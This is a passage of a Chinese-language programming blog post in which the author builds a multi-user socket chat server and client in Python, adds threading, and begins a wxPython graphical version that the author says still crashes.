comment">#获取本地主机名</span>server_port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置端口</span>max_recedata <span class="token operator">=</span> <span class="token number">1024</span>  <span class="token comment"># 设置最大接收字节数</span>client_name <span class="token operator">=</span> <span class="token string">'Nacy'</span><span class="token keyword">print</span><span class="token punctuation">(</span>server_host<span class="token punctuation">)</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span>server_port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span> <span class="token comment">#先接收历史消息</span><span class="token keyword">if</span> msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'No message.'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n------以上是历史消息------\n'</span><span class="token punctuation">)</span><span class="token comment">#接收文字的线程</span><span class="token comment">#由于用户的发送和接收消息是不同步的，在接收消息时线程会阻塞，所以另开启一个线程进行接收文字</span><span class="token keyword">class</span> <span class="token class-name">ThreadReceive</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            receive_msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>receive_msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>textThread <span class="token operator">=</span> ThreadReceive<span class="token punctuation">(</span><span class="token punctuation">)</span>textThread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#发送文字</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        send_msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入：'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> send_msg<span class="token operator">==</span><span class="token string">'0'</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>client_name<span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span>send_msg<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="代码0-5"><a href="#代码0-5" class="headerlink" title="代码0.5"></a><strong>代码0.5</strong></h3><p><strong>作用：在0.4基础上加了时间戳，将input里的字符删了，直接输就行……</strong></p><p><a href="https://blog.csdn.net/cheneykl/article/details/79717160">(29条消息) Python 给某个文件名添加时间戳_cheney康的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/drdairen/article/details/60962439">(29条消息) python：threading.Thread类的使用详解_啊啊啊西吧的博客-CSDN博客_python thread</a></p><p><a href="https://www.yisu.com/zixun/720956.html">python中的多线程锁lock=threading.Lock()如何使用 - 开发技术 - 亿速云 (yisu.com)</a></p><pre class="line-numbers language-none"><code class="language-none">mutex &#x3D; threading.Lock()#锁的使用#创建锁mutex &#x3D; threading.Lock()#锁定mutex.acquire([timeout])#释放mutex.release()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现没啥要修改的……</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端import socket</span><span class="token keyword">import</span> socket<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取本地主机名</span>port <span class="token operator">=</span> <span class="token number">9999</span>  <span class="token comment"># 设置端口</span>max_connect <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 设置最大连接客户端数</span>max_recedata <span class="token operator">=</span> <span class="token number">1024</span>  <span class="token comment"># 设置最大接收字节数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment"># 创建socket对象</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 绑定端口号</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span>max_connect<span class="token punctuation">)</span>  <span class="token comment"># 开始监听;最大连接2台客户端，超过后排队</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ServerSocket is ready.'</span><span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 当前在线人数</span>textList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储历史记录</span>socketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储已有客户端（套接字）</span><span class="token comment"># 自定义类继承，重写run()方法</span><span class="token keyword">class</span> <span class="token class-name">ThreadCreate</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 线程初始化</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>  <span class="token comment"># 当作Thread的固定结构吧……</span>        self<span class="token punctuation">.</span>client <span class="token operator">=</span> client  <span class="token comment"># 保存嵌套字（客户端）</span>        socketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>  <span class="token comment"># 把嵌套字存在列表里</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">global</span> cnt            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                <span class="token keyword">if</span> sock <span class="token operator">==</span> self<span class="token punctuation">.</span>client<span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Welcome!There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'New Client is Coming.There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                word <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收数据</span>                textList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token comment">#生成历史记录</span>                <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span> <span class="token comment">#给所有客户端发送新消息</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token operator">+</span>word<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span> <span class="token comment">#客户端强制断开连接（关闭窗口）</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#如何加一个时间戳？</span>            cnt <span class="token operator">=</span> cnt<span class="token operator">-</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span>            socketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>self<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token comment">#移除该客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    client<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 创建客户端连接，每次接收一个连接</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"连接地址：%s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 关于历史记录的处理</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>textList<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'No message.'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>textList<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cnt <span class="token operator">=</span> cnt <span class="token operator">+</span> <span class="token number">1</span>  <span class="token comment"># 来了一个人加一</span>        <span class="token comment"># 给用户创建新进程</span>        newThread <span class="token operator">=</span> ThreadCreate<span class="token punctuation">(</span>client<span class="token punctuation">)</span>        newThread<span class="token punctuation">.</span>setDaemon<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 设置为守护线程</span>        newThread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 开启线程</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!The number of people is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># finally:</span>    <span class="token comment">#     client.close()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token keyword">import</span> threadingserver_host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#获取本地主机名</span>server_port <span class="token operator">=</span> <span class="token number">9999</span> <span class="token comment">#设置端口</span>max_recedata <span class="token operator">=</span> <span class="token number">1024</span>  <span class="token comment"># 设置最大接收字节数</span>client_name <span class="token operator">=</span> <span class="token string">'Helen'</span><span class="token keyword">print</span><span class="token punctuation">(</span>server_host<span class="token punctuation">)</span>lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#创建锁</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting......'</span><span class="token punctuation">)</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>server_host<span class="token punctuation">,</span>server_port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Connecting is successful!'</span><span class="token punctuation">)</span>msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span> <span class="token comment">#先接收历史消息</span><span class="token keyword">if</span> msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string">'No message.'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n------以上是历史消息------\n'</span><span class="token punctuation">)</span><span class="token comment">#接收文字的线程</span><span class="token comment">#由于用户的发送和接收消息是不同步的，在接收消息时线程会阻塞，所以另开启一个线程进行接收文字</span><span class="token keyword">class</span> <span class="token class-name">ThreadReceive</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                receive_msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>receive_msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>textThread <span class="token operator">=</span> ThreadReceive<span class="token punctuation">(</span><span class="token punctuation">)</span>textThread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#发送文字</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            send_msg <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> send_msg <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span>client_name<span class="token operator">+</span><span class="token string">': '</span><span class="token operator">+</span>send_msg<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初级阶段3：可视化"><a href="#初级阶段3：可视化" class="headerlink" title="初级阶段3：可视化"></a>初级阶段3：可视化</h2><h3 id="代码0-6"><a href="#代码0-6" class="headerlink" title="代码0.6"></a><strong>代码0.6</strong></h3><p><strong>作用：有问题，修理中……主要是服务器老炸了……可能是类的原因</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> threading<span class="token keyword">def</span> <span class="token function">getIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip<span class="token operator">=</span>s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> iphost <span class="token operator">=</span> getIP<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 获取本地主机名</span>port <span class="token operator">=</span> <span class="token number">8000</span>  <span class="token comment"># 设置端口</span>max_connect <span class="token operator">=</span> <span class="token number">2</span>  <span class="token comment"># 设置最大连接客户端数</span>max_recedata <span class="token operator">=</span> <span class="token number">2048</span>  <span class="token comment"># 设置最大接收字节数</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span>cnt <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 当前在线人数</span>textList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储历史记录</span>socketList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储已有客户端（套接字）</span><span class="token comment"># 自定义类继承，重写run()方法</span><span class="token keyword">class</span> <span class="token class-name">ThreadCreate</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> client<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 线程初始化</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token comment"># 当作Thread的固定结构吧……</span>        self<span class="token punctuation">.</span>client <span class="token operator">=</span> client        <span class="token comment"># 保存嵌套字（客户端）</span>        socketList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>client<span class="token punctuation">)</span>        <span class="token comment"># 把嵌套字存在列表里</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">global</span> cnt            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                <span class="token keyword">if</span> sock <span class="token operator">==</span> self<span class="token punctuation">.</span>client<span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Welcome!There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'New Client is Coming.There are %d presons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                word <span class="token operator">=</span> self<span class="token punctuation">.</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>max_recedata<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#接收数据</span>                textList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>word<span class="token punctuation">)</span>                <span class="token comment"># 生成历史记录</span>                <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                    <span class="token comment"># 给所有客户端发送新消息</span>                    sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token operator">+</span>word<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token comment"># 客户端强制断开连接（关闭窗口）</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">repr</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 如何加一个时间戳？</span>            cnt <span class="token operator">=</span> cnt<span class="token operator">-</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span>            socketList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>self<span class="token punctuation">.</span>client<span class="token punctuation">)</span> <span class="token comment"># 移除该客户端</span>            <span class="token keyword">for</span> sock <span class="token keyword">in</span> socketList<span class="token punctuation">:</span>                sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'Lose one person.There are %d persons.'</span><span class="token operator">%</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'多人聊天系统（服务器）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072960</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck<span class="token punctuation">.</span>SetOwnBackgroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'启动客户端'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">227</span><span class="token punctuation">,</span> <span class="token number">160</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'关闭客户端'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">240</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token 